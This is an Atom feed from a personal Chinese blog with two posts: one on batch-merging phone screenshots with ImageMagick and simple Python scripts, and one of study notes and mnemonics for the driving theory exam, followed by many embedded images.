<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>夏日 の blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zssblog.top/"/>
  <updated>2020-06-03T01:47:37.843Z</updated>
  <id>http://zssblog.top/</id>
  
  <author>
    <name>夏日</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>由快速合并图片引发的思考</title>
    <link href="http://zssblog.top/2020/06/03/%E7%94%B1%E5%BF%AB%E9%80%9F%E5%90%88%E5%B9%B6%E5%9B%BE%E7%89%87%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>http://zssblog.top/2020/06/03/%E7%94%B1%E5%BF%AB%E9%80%9F%E5%90%88%E5%B9%B6%E5%9B%BE%E7%89%87%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</id>
    <published>2020-06-03T01:46:00.000Z</published>
    <updated>2020-06-03T01:47:37.843Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>我在上篇文章里分享了自己的科目一经验：<a href="http://zssblog.top/2020/06/02/%E7%A7%91%E7%9B%AE%E4%B8%80%E5%BF%85%E8%BF%87%E5%AE%9D%E5%85%B8/">点我查看</a>，但细心地大家会发现在图片标题下都是手机截屏的图片合并成一张的，在次记录下整个合并过程(linux+python)。</p><h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>手机上的图片都是长方形显然不可能直接一张就显示在页面上，为此我们需要每几张合并成一张优化体验。<br>起初我尝试在线网站合并图片，奈何总共100多张图片太麻烦了，这一点不符合一个it行业的人做的事(hhha)。<br>于是突然想到可以用Linux的convert命令。</p><p>以下命令代表将1.jpg、2.jpg、3.jpg水平合并成new1.jpg</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert +append <span class="number">1</span>.jpg <span class="number">2</span>.jpg <span class="number">3</span>.jpg new1.jpg</span><br></pre></td></tr></table></figure><h1 id="着手去做"><a href="#着手去做" class="headerlink" title="着手去做"></a>着手去做</h1><p>由于是手机上的图片传到电脑上的，文件名杂乱不齐。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602223548569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>首先我们需要先让每个图片的名字有序化<br>于是我写了个简单的Python脚本将其命名为1、2、3等名称</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">"/home/zss/Desktop/kemuyi"</span></span><br><span class="line">pic_list = os.listdir(path)</span><br><span class="line">n=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pic_list:</span><br><span class="line">os.rename(i,<span class="string">"./"</span>+str(n)+<span class="string">".jpg"</span>)</span><br><span class="line">n+=<span class="number">1</span></span><br><span class="line">print(<span class="string">"重命名成功"</span>)</span><br></pre></td></tr></table></figure><p>结果如下<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602223736194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>接下来就是重复的使用convert命令来合并这些图片。本来我是想用shell脚本来直接执行，奈何过了半年老师讲的shell脚本知识早已还给老师了。<br>这时候还是得祭出Python，我们可以用Python把这些命令输出出来，然后再执行下就可，说干就干。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string=<span class="string">"convert +append "</span></span><br><span class="line">houzhui=<span class="string">".jpg "</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">44</span>):</span><br><span class="line">print(string,end=<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">print(str(<span class="number">3</span>*m+n+<span class="number">1</span>)+houzhui,end=<span class="string">""</span>)</span><br><span class="line">print(<span class="string">"new"</span>+str(m+<span class="number">1</span>)+<span class="string">".jpg"</span>)</span><br></pre></td></tr></table></figure><p>运行结果如下<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602224055827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>接下来只需将这些命令复制到shell脚本中执行即可。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602224155115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>这里放一张合并后的照片<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602224309544.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>至此全部完成。</p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>通过简单的小案例让我更加明白改变生活的不是科技，而是Linux+Python(手动加狗头🐶)。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;我在上篇文章里分享了自己的科目一经验：&lt;a href=&quot;http://zssblog.top/2020/06/02/%E7%
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="日常办公" scheme="http://zssblog.top/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
  <entry>
    <title>科目一必过宝典</title>
    <link href="http://zssblog.top/2020/06/02/%E7%A7%91%E7%9B%AE%E4%B8%80%E5%BF%85%E8%BF%87%E5%AE%9D%E5%85%B8/"/>
    <id>http://zssblog.top/2020/06/02/%E7%A7%91%E7%9B%AE%E4%B8%80%E5%BF%85%E8%BF%87%E5%AE%9D%E5%85%B8/</id>
    <published>2020-06-02T14:48:17.000Z</published>
    <updated>2020-06-03T01:48:10.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>科目一今天满分飘过，特此分享下自己打的笔记。<br>如果你想问我只是科目一而已用的着那么认真吗，别问，问就是因为没复习挂过一次。<br>之所以写这篇文章的原因是提醒大家当时我是过了全部题后之后只做某考宝典的模拟题，一直是95以上，但考试的时候发现考试比手机模拟难的多，好多易错题手机模拟根本碰不到，这里建议大家用网页版的模拟。另外只要大家把我发的知识点记住图片题目看了之后过绝对没问题。<br>建议考前一天把全部题再做一遍，我是昨天用了几个小时过了一遍总共错了3道，今天考试的时候发现总共有3题不是题库里的，不过知识点都是一样的。科目一虽说较简单的一科，但也不要掉以轻心，小心成为下一个我，haha。如果有其他疑问，随时欢迎咨询。<br>如果你对图片标题下的为什么能合并3张手机图片感兴趣，请查看我的另一篇文章：<a href="http://zssblog.top/2020/06/03/由快速合并图片引发的思考/">由快速合并图片引发的思考</a></p><h1 id="知识点速记"><a href="#知识点速记" class="headerlink" title="知识点速记"></a>知识点速记</h1><p>1.有线城5公7，没线城3公4</p><p>有中心线城市城市限速50km/h,公路限速70km/h</p><p>2.右让左，左让直，转弯让直行</p><p>3.没有图的问题速度都不能超30km/h</p><p>4.假一吊二撤三醉五逃终生</p><p>虚假资料一年内不得重新申请驾照</p><p>5.能见度261,145,520</p><p>能见度小于200m,限速60，保持100m的距离</p><p>能见度小于50，限速20，尽快离开高速</p><p>6.高速故障在150m外放警告标志，一般路50-100m放</p><p>7.事故有伤亡就立即抢救否则立即都是错的</p><p>8.一条虚线(2个车道)一个1(最左边100)，两条虚线两个1</p><p>两条车道：100    60</p><p>三条车道：110    90    60</p><p>四条车道：110    90    90    60</p><p>9.站30米内不停车   加油站、公交车站</p><p>口50米内不停车    交叉路口、陡坡</p><p>10.高速公路不系安全带罚款50扣2分，一般路罚款50不扣分</p><p>11.==无证驾驶不算危险驾驶==</p><p>12.开车打电话扣2分</p><p>13.有人身伤亡就必须得报警</p><p>14.右转进入高速公路也是开左转向灯（左进右出）</p><p>15.驾驶证过期前90天申请换驾驶证</p><p>16.有罚找罚，没罚找吊，20元的罚不要</p><p>17.追逐竞驶拘留罚款不会判刑</p><p>18.信息变化30天备案，丢，毁，过期的90天补办（没有90就选30）</p><p>19.酒精含量20-80酒驾，80以上醉驾</p><p>20.所有人，行驶证去登记地。驾驶人，驾驶证去核发地</p><p>21.有争议就得报警</p><p>22.从左到右是离合踏板，制动踏板，加速踏板</p><p>23.转向灯上提是右转向灯(古代以右为尊)</p><p>24.汽车找汽车（准驾汽车可以开选项中的汽车），自动找自动</p><p>25.判断题罚款出现200的（200-2000也算）就对</p><p>26.判断题横着的红绿灯都错，竖着的红绿灯都对</p><p>27.客运驾驶人在24小时内累计驾驶时间不得超过<strong>8小时</strong>，连续驾驶时间不得超过4小时，每次停车休息时间不少于20分钟。</p><p>28.交警左手上下摆动是左转弯待转，右手是减速</p><p>29.驾驶证有效期为6年、10年、终身。</p><h1 id="其他总结"><a href="#其他总结" class="headerlink" title="其他总结"></a>其他总结</h1><h2 id="危险驾驶"><a href="#危险驾驶" class="headerlink" title="危险驾驶"></a>危险驾驶</h2><ul><li>追逐竞驶，情节恶劣</li><li><strong>醉酒驾驶</strong></li><li>拉人的严重超载或超速</li><li>拉化学品不按规定的</li></ul><p>==无证驾驶不算危险驾驶==</p><h2 id="交警手势"><a href="#交警手势" class="headerlink" title="交警手势"></a>交警手势</h2><p>1.交警手势剪刀手就是转弯，面向谁从哪看，交警手指哪个方向就是啥转弯</p><p>2.交警手在心口就是变道（人心善变）</p><p>3.右手手势从高（速度快）到低（速度慢）就是减速</p><p>4.靠边停车一个手伸超过头顶（停车），转弯时一个手平伸</p><h2 id="扣分总结"><a href="#扣分总结" class="headerlink" title="扣分总结"></a>扣分总结</h2><p>不按规定会车扣1分</p><p>高速打电话扣2分</p><p>违反交通禁令标志扣3分</p><p>出事不放危险报警闪光灯扣3分</p><p>高速逆行扣12分普通扣3</p><p>扣6分的有</p><ul><li>违反交通信号灯</li><li>占用应急车道</li><li>不避让校车</li><li>高速低于能见度200m速度超过60的</li></ul><h2 id="违法判刑题"><a href="#违法判刑题" class="headerlink" title="违法判刑题"></a>违法判刑题</h2><p>1、不跑3年以下(不管死没死)，跑了3-7，因跑致死7年以上</p><p>2、违反交规发生重大事故致人重伤的：3年以下。（没跑）</p><p>3、违反交规发生重大事故使公私财产遭受重大损失的：3年以下。（没跑）</p><p>4、违反交规发生重大事故致人死亡且逃逸的：3年以上7年以下。（跑了）</p><p>5、违反交规发生重大事故因逃逸导致他人死亡的：7年以上。（因为跑才死）</p><h2 id="违法罚款题"><a href="#违法罚款题" class="headerlink" title="违法罚款题"></a>违法罚款题</h2><p>1、 罚款200-500元：客运车超员没超过20%的、货运车超载没超过30%的。（若超员超载超过了罚500-2000）</p><p>2、 罚款200-2000元：未取得机动车驾驶证、机动车驾驶证被吊销或者机动车驾驶证被暂扣期间驾驶机动车的；将机动车交由未取得机动车驾驶证或者机动车驾驶证被吊销、暂扣的人驾驶的；造成交通事故后逃逸，尚不构成犯罪的；机动车行驶超过规定时速50%的。（无证、交给无证、逃逸、超速50）</p><p>3、 罚款1000-2000元：饮酒后驾驶机动车的. 因饮酒后驾驶机动车被处罚，再次饮酒后驾驶机动车的。(酒驾注意不是醉驾)</p><p>4、 罚款2000-5000元：使用其他车辆的机动车登记证书、号牌、行驶证、检验合格标志、保险标志的；伪造、变造或者使用伪造、变造的机动车登记证书、号牌、行驶证、驾驶证的。(伪造作假)</p><p>5.饮酒驾驶<strong>营运机动车</strong>，处十五日拘留，并罚款<strong>5000</strong>（营运车罚的多）</p><h2 id="人车总结"><a href="#人车总结" class="headerlink" title="人车总结"></a>人车总结</h2><p>只要机动车上路行驶，就必须悬挂号牌，放置检验合格标志、保险标志，随车携带行驶证和驾驶证。</p><p>缺少任何一项，交警都可以依法扣留车辆， ==不存在扣留行驶证的说法==。</p><p>其实可以理解为一个知识点，就是：到底是车有问题，还是人有问题！</p><p>只要车有问题，就扣车；人有问题就吊销驾照；如果人有问题车也有问题，那就吊销驾照并收缴车辆！不涉及到犯罪的，不会拘留人！</p><p><strong>车有问题指：</strong>伪造、变造与车有关的一切证件、牌号，以及未放置保险证，所以处罚是扣车。</p><p><strong>人有问题指：</strong>伪造，变造与驾驶有关的一切证件、严重违反交规如饮酒等，所以处罚是吊销驾照。</p><p><strong>人、车都有问题：</strong>驾驶拼改装、报废车辆，处罚是吊销驾照并收缴车辆。</p><h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221844577.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221844487.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221844463.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221844431.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221844233.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221914887.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221914851.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221914796.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221914786.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221914663.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221912798.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221912581.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020060222191173.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020060222191110.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221948591.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221948571.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221948480.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221948468.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221948365.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221948246.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221947874.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221947371.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020060222194711.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221946643.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221946550.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221946328.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221945457.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221941722.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222026522.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222026410.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222026404.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222026382.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222026278.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222026274.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020060222202633.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222025996.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222025992.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222025906.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222025129.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020060222202532.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222021952.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222021382.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222054180.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222053744.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzE2MDMzOTU4My5wbmc?x-oss-process=image/format,png"  alt="image-20200517160339583"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzE2MDI1MzUwNC5wbmc?x-oss-process=image/format,png"  alt="image-20200517160253504"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNjIyMTczOTgyMi5wbmc?x-oss-process=image/format,png"  alt="image-20200517122511156"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzIwMjMzOTE1OC5wbmc?x-oss-process=image/format,png"  alt="image-20200517202339158"></p><p><img src="/" class="lazyload" 